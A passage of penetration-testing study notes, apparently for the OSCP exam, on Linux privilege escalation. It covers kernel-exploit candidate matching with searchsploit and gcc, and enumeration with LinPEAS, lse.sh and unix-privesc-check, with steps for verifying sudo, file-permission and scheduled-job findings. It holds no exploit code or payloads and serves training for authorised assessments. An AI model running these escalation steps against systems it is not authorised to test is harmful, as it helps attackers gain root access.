**Verify:** Verify actual effective UID/host context after the exploit, keeping the reviewed source and adaptation record.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-kernel)

### Full procedure and variants

```bash
uname -a
cat /proc/version
cat /etc/os-release
dpkg -l 2>/dev/null
rpm -qa 2>/dev/null
sudo --version
lsmod
sysctl kernel.unprivileged_userns_clone 2>/dev/null
```

```bash
searchsploit "PRODUCT VERSION local privilege escalation"
searchsploit -x EDB_ID
searchsploit -m EDB_ID
gcc -Wall -Wextra exploit.c -o exploit
file exploit
sha256sum exploit
```

> Match component, exact distribution/build and patch/backport state, architecture, required configuration/capabilities/namespaces, mitigations and dependencies. Review source and recovery risk. A version title or successful compilation is only a candidate. Follow [public exploit adaptation](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/03-initial-access/06-public-exploit-adaptation.md).

### Follow the evidence

- [ Match a public exploit to the actual component and configuration](public-exploits.md#exploit-select) — A product/version clue, advisory or component-specific public PoC Required: Exact vulnerable build/configuration, required access and endpoint behavior; reviewable source and a verifiable expected effect
- [ Compile and minimally adapt an existing native or memory-corruption PoC](public-exploits.md#exploit-compile) — An existing C/C++ or platform-specific PoC matches the candidate Required: Correct compiler/target architecture, runtime dependencies, documented payload constraints and validated exploit-specific constants
- [ Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state) — A new Linux foothold or an identity/privilege change Required: A working command channel and accurate effective identity, group, mount and process context
## linux-enumerators

### Use enumeration tools to generate manually testable candidates

**Enter:** A Linux foothold is available; run an early sweep for sudo rules, file capabilities, credentials and writable privileged paths

**Discovery**

```text
id
uname -m
command -v bash python3
ls -ld /tmp
```

**Interpret:** The highlight supplies a candidate object, not the missing privileged consumer or execution trigger.

**Still check:** Run the reviewed LinPEAS baseline and save its output. For sudo highlights run sudo -l; for a flagged file use stat/namei/getfacl; for jobs confirm the UID and command with pspy or systemctl. Open the matching technique only after that check.

**Verify:** Read linpeas.txt. Confirm a reported sudo rule with sudo -l, a privileged path with namei/stat/getfacl, or a scheduled consumer with pspy before using that finding

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/linux-privesc/#linux-enumerators)

### Full procedure and variants

For the early collector pass, transfer a reviewed LinPEAS copy, check the current UID/architecture and save its output. This form does not require an executable bit:

```bash
sh ./linpeas.sh | tee linpeas.txt
```

Follow the named finding into the matching sudo, SUID/capability, writable-consumer or credential procedure. Use the local help for optional modes; broader/noisier checks are not the automatic baseline.


```bash
./linpeas.sh | tee linpeas.txt
./lse.sh | tee lse.txt
./lse.sh -l1 | tee lse-l1.txt
./unix-privesc-check standard > unix-privesc-check.txt
```

> LinPEAS optional flags vary by build. Read the local `./linpeas.sh -h` before selecting broader checks; they are not the automatic baseline. LSE progresses from default to `-l1`, then `-l2` only if needed. `unix-privesc-check detailed` is slower and more false-positive-prone.

For every highlight:

```text
exact object | effective permission | privileged consumer | identity | trigger | expected effect | manual verification
```

Do not pipe an unverified Internet download into the target shell. Acquire a trusted copy, retain its source/hash, transfer deliberately and remove assessment artifacts when appropriate.

### Follow the evidence

- [ Prove effective file, directory, ACL and mount control](linux-privesc.md#linux-permissions) — A root-consumed file or directory appears writable Required: Effective access through every parent/ACL and mount; a privileged consumer and trigger are identified separately
- [ Control a script, binary or configuration consumed by a privileged job/service](linux-privesc.md#linux-jobs) — Root-owned cron, systemd or recurring process activity uses a controllable object Required: Effective object control, actual privileged consumer identity, correct path/environment and an available schedule/restart trigger
- [ Use an allowed sudo operation to cross a privilege boundary](linux-privesc.md#linux-sudo) — sudo -l grants an operation under a more useful identity Required: Exact executable/run-as/argument rule permits a useful primitive; password tags, environment and policy do not invalidate it
